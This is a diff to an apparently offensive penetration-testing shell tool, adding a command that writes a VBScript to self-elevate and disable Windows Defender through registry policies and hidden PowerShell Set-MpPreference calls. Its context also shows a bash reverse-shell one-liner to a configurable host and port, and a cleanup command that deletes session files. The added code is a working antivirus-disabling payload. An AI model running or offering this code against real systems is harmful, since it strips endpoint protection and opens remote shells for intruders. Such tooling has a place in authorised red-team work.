@@ -1585,6 +1585,53 @@ class LazyOwnShell(Cmd):
         os.system(f"echo \"bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'\" |  xclip -sel clip")
         return
 
+    def do_disableav(self,line):
+        """visual basic script to try to disable antivirus"""
+
+        file_aav = '''If Not WScript.Arguments.Named.Exists("elevate") Then
+        CreateObject("Shell.Application").ShellExecute WScript.FullName _
+            , """" & WScript.ScriptFullName & """ /elevate", "", "runas", 1
+        WScript.Quit
+        End If
+
+        On Error Resume Next
+        Set WshShell = CreateObject("WScript.Shell")
+        WshShell.RegWrite "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\DisableAntiSpyware",1,"REG_DWORD"
+        WshShell.RegWrite "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection\DisableBehaviorMonitoring","1","REG_DWORD"
+        WshShell.RegWrite "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection\DisableOnAccessProtection","1","REG_DWORD"
+        WshShell.RegWrite "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection\DisableScanOnRealtimeEnable","1","REG_DWORD"
+        WshShell.RegWrite "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection\DisableRawWriteNotification","1","REG_DWORD"
+        WshShell.RegWrite "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection\DisableIOAVProtection","1","REG_DWORD"
+        WshShell.RegWrite "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection\DisableBehaviorMonitoring","1","REG_DWORD"
+
+        WScript.Sleep 100
+
+        outputMessage("Set-MpPreference -DisableRealtimeMonitoring $true")
+        outputMessage("Set-MpPreference -DisableBehaviorMonitoring $true")
+        outputMessage("Set-MpPreference -DisableBlockAtFirstSeen $true")
+        outputMessage("Set-MpPreference -DisableIOAVProtection $true")
+        outputMessage("Set-MpPreference -DisableScriptScanning $true")
+        outputMessage("Set-MpPreference -SubmitSamplesConsent 2")
+        outputMessage("Set-MpPreference -MAPSReporting 0")
+        outputMessage("Set-MpPreference -HighThreatDefaultAction 6 -Force")
+        outputMessage("Set-MpPreference -ModerateThreatDefaultAction 6")
+        outputMessage("Set-MpPreference -LowThreatDefaultAction 6")
+        outputMessage("Set-MpPreference -SevereThreatDefaultAction 6")
+
+
+        Sub outputMessage(byval args)
+        On Error Resume Next
+        Set objShell = CreateObject("Wscript.shell")
+        objShell.run("powershell " + args), 0
+        End Sub'''.replace('        ','')
+        filename = 'sessions/aav.vbs'
+        print_msg(f"new file in {filename} '")
+        with open(filename, 'w') as f:
+            f.write(file_aav)
+        f.close()
+        print_msg(f"Archivo {filename} creado con èxito en el directorio sessions con contenido: {file_aav} ")
+        return  
+
     def do_conptyshell(self,line):
         """Download ConPtyShell in sessions directory and copy to clipboard the command :D """
         lhost = self.params["lhost"]
@@ -1783,7 +1830,7 @@ class LazyOwnShell(Cmd):
 
     def do_clean(self, line):
         """delete all from sessions"""
-        os.system("rm external/.exploit sessions/credentials.txt sessions/*.ps1 sessions/*.scf sessions/chisel* sessions/*.xml sessions/*.elf sessions/*.macho sessions/*.zip sessions/*.exe sessions/*.nmap* sessions/*.py sessions/req*  sessions/revshell* sessions/*.php sessions/hash.txt reports puertos sessions/test* sessions/*.xsl *.xsl -rf")
+        os.system("rm sessions/aav.vbs external/.exploit sessions/credentials.txt sessions/*.ps1 sessions/*.scf sessions/chisel* sessions/*.xml sessions/*.elf sessions/*.macho sessions/*.zip sessions/*.exe sessions/*.nmap* sessions/*.py sessions/req*  sessions/revshell* sessions/*.php sessions/hash.txt reports puertos sessions/test* sessions/*.xsl *.xsl -rf")
         print_msg(f"Cleanned sessions & external directory. {RESET}")
         return
 
